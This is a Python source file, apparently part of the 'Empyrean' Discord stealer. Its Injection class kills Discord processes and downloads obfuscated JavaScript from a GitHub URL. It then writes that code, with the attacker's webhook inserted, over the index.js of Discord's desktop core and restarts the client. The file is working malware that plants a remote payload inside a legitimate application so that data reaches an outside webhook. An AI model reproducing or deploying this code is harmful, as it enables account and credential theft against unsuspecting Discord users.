import os
import re
import subprocess
import psutil
import requests


class Injection:
    def __init__(self, webhook: str) -> None:
        self.webhook = webhook
        self.discord_dirs = [
            os.path.join(os.getenv('LOCALAPPDATA'), dir_name)
            for dir_name in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment')
            if os.path.exists(os.path.join(os.getenv('LOCALAPPDATA'), dir_name))
        ]
        self.js_code = requests.get('https://raw.githubusercontent.com/addi00000/empyrean-injection/main/obfuscated.js').text

        self.inject()

    def inject(self):
        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower():
                proc.kill()

        for dir in self.discord_dirs:
            core_path, core_name = self.get_core_path(dir)
            if core_path is None:
                continue

            with open(os.path.join(core_path, 'index.js'), 'w', encoding='utf-8') as f:
                f.write((self.js_code)
                        .replace('discord_desktop_core-1', core_name)
                        .replace('%WEBHOOK%', self.webhook))

            self.start_discord(dir)

    def get_core_path(self, dir: str) -> tuple:
        for file in os.listdir(dir):
            if not re.search(r'app-+?', file):
                continue

            modules_path = os.path.join(dir, file, 'modules')
            if not os.path.exists(modules_path):
                continue

            for file in os.listdir(modules_path):
                if re.search(r'discord_desktop_core-+?', file):
                    core_path = os.path.join(modules_path, file, 'discord_desktop_core')
                    if os.path.exists(os.path.join(core_path, 'index.js')):
                        return core_path, file

        return None, None

    def start_discord(self, dir: str) -> None:
        update_path = os.path.join(dir, 'Update.exe')
        executable_path = os.path.join(dir, dir.split('\\')[-1] + '.exe')

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app_path = os.path.join(dir, file)
                if os.path.exists(os.path.join(app_path, 'modules')):
                    executable_path = os.path.join(app_path, executable_path.split('\\')[-1])
                    subprocess.call([update_path, '--processStart', executable_path],
                                    shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
